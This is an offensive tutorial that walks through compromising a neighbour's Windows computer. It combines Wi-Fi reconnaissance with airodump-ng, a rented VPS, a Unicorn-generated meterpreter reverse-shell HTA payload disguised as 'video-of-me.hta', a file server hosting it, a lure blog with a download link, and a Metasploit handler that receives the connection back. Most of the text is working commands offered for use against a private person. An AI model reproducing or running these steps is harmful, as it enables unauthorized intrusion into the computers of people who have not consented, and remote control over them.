HACK A NEIGHBOOR WITH A POST-IT NOTE
____________________________________


In this tutorial a kind of social engineering attack is used.

Steps do not include the previous social engineering and information gathering needed to know our target

STEPS
_____

1) Use airodump-ng to view the wireless network of the neighboor and identify the target
2) We will assume it's a windows system

3) Set up a VPS

   -> Enter signup page
   -> Create a droplet (cloud server in digital ocean)
   -> Debian 9 operating system
   -> Create button to start creating the cloud
   -> It will be sent an email with ssh password
   -> As it is finished, the IP will be displayed
   >> ssh root@Your-Server-IP-Address

   -> Disable Nginx

      >> systemctl stop nginx

4) Create the HTA Payload

   -> Unicorn python script will be used to create an HTML Application (HTA)
   -> Install python github and python3

   >> apt-get install git python python3

   >> git clone https://github.com/trustedsec/unicorn.git

   >> cd unicorn/

   >> python unicorn.py windows/meterpreter/reverse_tcp YourServerIPAddress 55555 hta

   -> Visit hta_attack, the payload is Launchar.hta

   >> mv Launcher.hta video-of-me.hta

   -> There's an "unicorn.rc" file that will automate Metasploit config for the handler

5) Make the payload accessible from internet

   -> We'll create a simple server to host the file

   -> In the hta_attack directory type

   >> python3 -m http.server 80 &

6) Installl metasploit framework

   -> Install as previously mentioned

   >> curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

   
7) Create a Website to cheat our victim

   -> Victim should visit a commom page such as:

      - Tumblr
      - WordPress
      - 000webhost
      - Wix
      - ...

   -> This is done by creating a blog where the victim should click

   -> To ensure that the video is downloaded by the victim, it will be needed to includ an html link

   <a href="http://YourServerVPSIPAddressHere/video-of-me.hta">click here to download my video</a>


8) Get a custom domain name

   With Dot.tk a custom domain name can be created. It's free to register and some domain names are free to use. For a .com domain, pricing starting from 4$ will be needed. We have to register our tumblr address.

9) Finally, start the handler in the VPS

   >> msfconsole -r /path/to/unicorn.rc
